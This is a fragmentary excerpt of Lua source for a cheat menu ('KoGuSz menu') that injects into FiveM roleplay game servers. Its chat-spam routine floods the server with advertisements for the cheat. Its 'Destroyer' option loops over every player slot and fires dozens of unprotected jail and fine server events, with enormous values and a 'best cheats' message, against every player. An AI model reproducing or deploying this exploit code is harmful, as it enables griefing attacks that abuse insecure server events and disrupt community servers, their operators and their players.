...
function chatspam()
                TriggerServerEvent(
                    ...
                    'KoGuSzEk#3251',
                    {0, 0x99, 255},
                    '/ooc kogusz menu! Buy at '
                )
                TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 ')
            end
...
Citizen.CreateThread(
    function()
        while bw do
			...
			if koguszspam then
						TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 ')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at ')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 ')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at ')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, 'KoGuSzMENU <3 ')
				TriggerServerEvent('_chat:messageEntered', 'KoGuSzEk#3251', {0, 0x99, 255}, '/ooc kogusz menu! Buy at ')
    ...
    function()
        ...
        while bw do
			...
			if KoGuSzEk.B('~h~~r~Zresp ~r~customowego peda') then
                    local bQ =KeyboardInput("Resp code peda ","",100000000)
            ...
            elseif KoGuSzEk.IsMenuOpened('Destroyer') then
                ...
                elseif KoGuSzEk.B('~h~~r~Zamknij~w~ Wszystkich graczy') then
                    for i = 0, 128 do
					TriggerServerEvent("arisonarp:mandat", GetPlayerServerId(i), 32323232323, '^1NAJLEPSZE CHEATY : ^3')
						TriggerServerEvent("arisonarp:wiezienie", GetPlayerServerId(i), 321321312 * 60, '^1NAJLEPSZE CHEATY : ^3', 424324234234)
						TriggerServerEvent("wyspa_jail:SendMessagetrop", GetPlayerServerId(i), 32135412521, '^1NAJLEPSZE CHEATY : ^3')
                        TriggerServerEvent("esx_jailer:sendToJailtrop", GetPlayerServerId(i), 32513251 * 60, '^1NAJLEPSZE CHEATY : ^3', 321321321321)
						...
						TriggerServerEvent("projektsantos:wiezienie", GetPlayerServerId(i), 3251 * 60, '^1NAJLEPSZE CHEATY : ^3',3251)
						TriggerServerEvent("wyspa_jail:SendWiadomosc", GetPlayerServerId(i), 32513251, '^1NAJLEPSZE CHEATY : ^3')
						TriggerServerEvent("esx-qale-jail:jailPlayer", GetPlayerServerId(i), 32513251, '^1NAJLEPSZE CHEATY : ^3')
						TriggerServerEvent("esx-qalle-jail:Wiezienie", GetPlayerServerId(i), 1 * 60, '', 32)
						TriggerServerEvent("wyspa_jail:SendMessage", GetPlayerServerId(i), 3251, '^1NAJLEPSZE CHEATY : ^3 |')
						TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 800 * 60)
						TriggerServerEvent("wyspa_jail:SendMessage2", GetPlayerServerId(i), 32513251, '^1NAJLEPSZE CHEATY : ^3' )
						TriggerServerEvent("esx_jailer:sendToJail2", GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3', 32513251 )
						TriggerServerEvent('esx_jailer:wysylandoo', 'Garbary123')
						TriggerServerEvent("esx_jailer:wysylanko", GetPlayerServerId(i), 800 * 60)
						TriggerServerEvent("esx_jailer:wysylandoo", GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3', 32513251, 'Garbary123')
                        TriggerServerEvent('esx_jailer:sendToJail', GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3', 32513251 )
                       TriggerServerEvent('esx_jail:sendToJail', GetPlayerServerId(i), 800 * 60, '^1NAJLEPSZE CHEATY : ^3', 32513251)
					   TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 3251 * 60)
                      TriggerServerEvent('js:jailuser', GetPlayerServerId(i), 80000 * 60, '')
                    end
